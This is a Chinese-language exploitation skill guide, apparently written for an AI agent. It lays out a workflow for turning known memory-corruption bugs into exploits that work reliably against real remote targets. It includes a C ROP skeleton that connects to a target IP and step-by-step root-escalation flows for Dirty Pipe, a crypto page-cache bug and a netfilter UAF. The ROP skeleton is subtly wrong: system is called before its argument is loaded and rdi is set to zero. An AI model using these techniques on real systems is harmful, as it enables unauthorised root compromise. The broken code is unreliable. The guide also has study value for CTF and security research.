# Pwn 利用链（pwn-chain）

目标：从已识别的漏洞点写出**稳定打通的 working exploit**，不是只能本地复现、远程一打就崩的脚本。**强调 CTF 本地通 → 真实远程稳定打通的工程差距。**

## 一、前提与分工

前提：已经知道"哪里炸了"（溢出/UAF/double free）。本技能不负责发现漏洞（那是 fuzzing/审计），只负责从漏洞点写 exploit。

## 二、核心工作流

```text
Step 1: 确认漏洞类型 + 保护机制
   ├─ checksec ./vuln（NX/Canary/PIE/RELRO/Fortify）
   ├─ 漏洞分类：栈溢出/格式化串/堆(UAF/DF/OF)/整数/竞态/内核
   └─ → 决定走哪个策略

Step 2: 选择利用策略
   ├─ NX 关 + 无 ASLR → 直接 shellcode
   ├─ NX 开 + 给 libc → ret2libc / one_gadget
   ├─ NX 开 + 不给 libc → leak 后 libc-database 反查
   ├─ 堆 → 按 glibc 版本对应技术(tcache/fastbin/unsorted/large)
   └─ 内核 → commit_creds / modprobe_path / core_pattern

Step 3: 准备 libc + gadget
   ├─ libc-database：./find puts 0x6f0
   ├─ ROPgadget --binary ./libc.so.6 --only "pop|ret"
   ├─ one_gadget ./libc.so.6
   └─ 计算 base：leak_addr - libc.sym['puts']

Step 4: 写 pwntools 模板（本地 process）
   ├─ context.binary = ELF('./vuln')
   ├─ p = process('./vuln') / gdb.debug('./vuln','b *main+xx')
   ├─ payload = cyclic(N) + p64(ret) + ...
   └─ p.interactive()

Step 5: 本地通
   ├─ 反复 attach + 看寄存器 + 调 offset
   ├─ pwndbg/GEF 的 vmmap/heap/bins/telescope
   └─ 跑通后切 remote()

Step 6: 远程稳定化
   ├─ libc 偏移：用 leak 反查 libc-database，不拍脑袋
   ├─ 栈对齐：16-byte 不对齐 → movaps 崩 → 加一个 ret gadget
   ├─ 远程延迟 → recvuntil 精确锚字符串，禁用模糊 sleep
   ├─ 远程缓冲：sendlineafter 比 sendline 更稳
   ├─ 堆喷成功率：放大 spray + 留 padding chunk 防合并
   └─ 多次跑：while True 验证成功率 ≥ 95%
```

## 三、典型场景

### 远程 64 位二进制（NX+PIE+canary，给了 libc）
1. leak canary（栈/格式化串/部分读）
2. leak 一个 libc 函数地址（puts@got）
3. `libc.address = leaked - libc.sym['puts']` 算 base
4. `one_gadget` 选约束能满足的 gadget
5. `payload = padding + canary + saved_rbp + (pop_rdi + bin_sh + system)` 或直接 one_gadget
6. 加一个 ret gadget 修栈对齐（关键）

### Linux 内核驱动 ioctl 越界写 → 拿 root
1. 改 init 脚本拿 root shell（CTF）或先 leak KASLR base（真实）
2. 通过 `/proc/kallsyms` 或未初始化堆喷 leak 内核基址
3. 在 kmalloc-64 slab 喷 tty_struct/msg_msg/pipe_buffer
4. 覆盖 vtable 指针 → 不行（SMEP），改 stack pivot + 内核 ROP
5. ROP 链：`prepare_kernel_cred(0)` → `commit_creds` → `swapgs+iretq` → 用户态 execve
6. 或覆盖 `modprobe_path` 为 `/tmp/x`，写 `/tmp/x`，触发 modprobe

## 四、工具链

| 工具 | 用途 |
|---|---|
| pwntools | exploit 编写框架 |
| GEF / pwndbg | gdb 增强（堆调试体验最好） |
| ROPgadget / Ropper | gadget 搜索 |
| one_gadget | libc magic gadget |
| libc-database | libc 指纹反查 |
| qemu-system | 内核题调试 |

## 五、注意事项

- **不要在本地跑通就交差** — 本地 libc/ASLR/网络与远程不同，必须 remote 连续跑 20 次以上验证稳定性
- **libc 版本必须确认** — leak + libc-database 反查，不假设默认版本
- **栈对齐是 64 位常见坑** — `movaps xmm0,[rsp]` 未 16 字节对齐时段错误，加空 ret gadget 解决
- **堆利用对 glibc 版本极敏感** — tcache(2.27+)、safe-linking(2.32+)、2.34 移除 hooks，每版路径不同
- **内核 pwn 先确认 cpu 标志** — qemu 启动参数有无 +smep/+smap/+pku 决定 ROP 写法
- **KASLR leak 一次就够** — 拿到一个内核地址后所有地址算偏移

## 六、验证

- [ ] remote 模式连续 20+ 次触发，成功率 ≥ 95%（统计触发/崩溃次数）
- [ ] 拿到预期权限：`id` 显示 uid=0 或拿到交互 shell（执行 `id`/`whoami` 确认）
- [ ] 栈对齐验证：ROP 链执行无崩溃，`rsp` 8 字节对齐（调试器观察栈指针）
- [ ] libc 偏移验证：`/proc/<pid>/maps` 确认 libc 基址，偏移计算与实际匹配
- [ ] 堆喷时序验证：多次运行堆布局稳定，受害者对象落在预期 slab 缓存池（`watch *set->ops` 确认）

## 六·五、代码骨架：远程 64 位栈溢出 ROP 模板

> 可编译运行的最小 ROP 利用骨架，关键地址/偏移用 `[TARGET]` 占位，按样本替换。

```c
// pwn_rop.c — 远程栈溢出 ROP 利用骨架（64 bit, NX+PIE+canary 已绕过后）
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// 占位：从样本/泄露获取
unsigned long libc_base   = [LIBC_BASE];
unsigned long system_addr = [SYSTEM_ADDR];   // libc_base + offset
unsigned long bin_sh_addr = [BIN_SH_ADDR];   // libc_base + offset
unsigned long ret_gadget = [RET_GADGET];     // "ret" 或 "pop rdi; ret" gadget

// ROP 链布局（小端）
unsigned long rop_chain[] = {
    ret_gadget,        // 对齐/清理
    ret_gadget,
    ret_gadget,
    ret_gadget,
    ret_gadget,
    ret_gadget,
    ret_gadget,        // 凑足栈对齐（按实际需要调整个数）
    system_addr,
    0,                 // rdi = NULL（或 bin_sh 地址）
    bin_sh_addr,
    [RET_ADDR],        // 返回地址占位
};

int main(int argc, char **argv) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons([PORT]);
    inet_pton(AF_INET, [TARGET_IP], &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect"); return 1;
    }

    // 构造 payload：填充 + canary 绕过（已知值）+ ROP 链
    char payload[1024];
    unsigned long *p = (unsigned long*)payload;
    int off = [OFFSET];  // 溢出到返回地址的偏移

    for (int i = 0; i < off/8; i++) p[i] = 0x41414141;  // 填充
    // canary 位置（若已知）
    p[off/8] = [CANARY];
    // ROP 链
    for (size_t i = 0; i < sizeof(rop_chain)/sizeof(unsigned long); i++)
        p[off/8 + 1 + i] = rop_chain[i];

    send(sock, payload, sizeof(payload), 0);
    // 交互或接收回显
    char buf[4096];
    while (recv(sock, buf, sizeof(buf), 0) > 0) {
        write(1, buf, 4096);
    }
    close(sock);
    return 0;
}
```

编译：`gcc -o pwn_rop pwn_rop.c -static`（或动态链接按样本调整）。验证：`./pwn_rop` 触发后拿到 shell，`id` 确认权限。

> 更新：2026-11-17 · 来源：骨架为通用模板，配合 §三典型场景使用

## 七、Linux 内核漏洞利用实战

> 通用原语详见 `common-techniques.md §6`（page cache 写入类漏洞）、`§7.3`（Egg Hunter）。本节侧重各漏洞的利用流程与堆布局。

- **CVE-2022-0847 Dirty Pipe（291662）**：`pipe_buffer.flags` 未正确初始化，`splice()` 从文件引入的 page cache 被错误标记 `PIPE_BUF_FLAG_CAN_MERGE`，后续 `write()` 直接写入 page cache 修改任意只读文件。利用：①prepare_pipe——建管道、写满（内核自动设 CAN_MERGE）、读空 drain（**flags 没清零**残留 CAN_MERGE）；②`splice(fd,&offset,p[1],NULL,1,0)` 将只读文件 page cache 引入管道，`copy_page_to_iter_pipe()` 未设 flags=0；③write() 直接写 page cache。验证：修改 /etc/passwd 等只读文件，提权 root。
- **Copy Fail（291784）**：Linux crypto 子系统逻辑漏洞，普通用户向任意可读文件 Page Cache 写 4 个可控字节获 root。经 AF_ALG 调 authencesn（AEAD+ESN），ESN 高 32 位临时写到认证标签预留空间（ESN scratch write），加密/认证失败时流程提前退出，4 字节残留 dst buffer。splice() 零拷贝将文件 page cache 页引用传管道，错误当可修改缓冲区。验证：AF_ALG 调 authencesn 控制 aad，向只读文件 page cache 写 4 字节提权。
- **CVE-2023-32233 Netfilter UAF（290012）**：nf_tables 匿名集合生命周期 UAF。`nf_tables_deactivate_set` 在 `NFT_TRANS_PREPARE` 仅递减 `set->use` 未 unbind，计数归零对象残留链表，同 Batch 编排"删除规则→显式删除集合"触发 Double Free。利用：①建主表+lookup_chain（受害者规则）+log_chain（喷射）；②喷射匿名集合清 SLUB 空闲列表，中段分配 s_a（userdata 调 0x100 落 kmalloc-256），`watch *set->ops` 监控；③向 set_delay 集合填海量元素（0x300*0x800），删除时内核漫长释放循环造数十毫秒延迟；④s_a 第一次释放后立即建竞争集合（name 大小属 kmalloc-cg-256 覆盖 s_a 原槽位），`nf_tables_newset` 断点拦截覆盖瞬间。验证：Type Confusion 绕 KASLR 劫持内核控制流提权。
- **Egg Hunter（289666）**：解决溢出后 shellcode 位置不确定或距离远无法直接跳转。原理：远程内存（堆/全局段）放"蛋"（8 字节标记 `w00tw00t`+shellcode），溢出点写精简"猎人"（32 字节）遍历内存页搜索标记，找到则 JMP。猎人逻辑：遍历页（syscall/SEH 判可读）→比较标记→不是继续→是则 JMP。适用栈溢出空间小、shellcode 在远处、写入偏移因系统而异。验证：SEH 溢出中跨内存页找到蛋并跳转执行。

## 八、WinAFL 模糊测试（293205）

- **流程**：下载 WinAFL 源码+DynamoRIO→VS 编译（`cmake -G"Visual Studio 18 2026" -A x64 .. -DDynamoRIO_DIR=...`）→VM 验证 DynamoRIO（`drrun.exe -- target.exe`）→IDA 选目标函数→计算偏移→fuzz→WinDbg 分析 crash。
- **目标函数四条件**：内部打开输入文件、解析它、关闭文件、正常返回（直接退出进程则持久化 fuzzing 失效）。
- **定位方法**：搜字符串（如 Usage 提示）顺交叉引用找 main，分析其"打开→解析→关闭→返回"完整流程。
- **验证**：对 test_gdiplus.exe fuzz 出 crash，WinDbg 分析两类 crash。
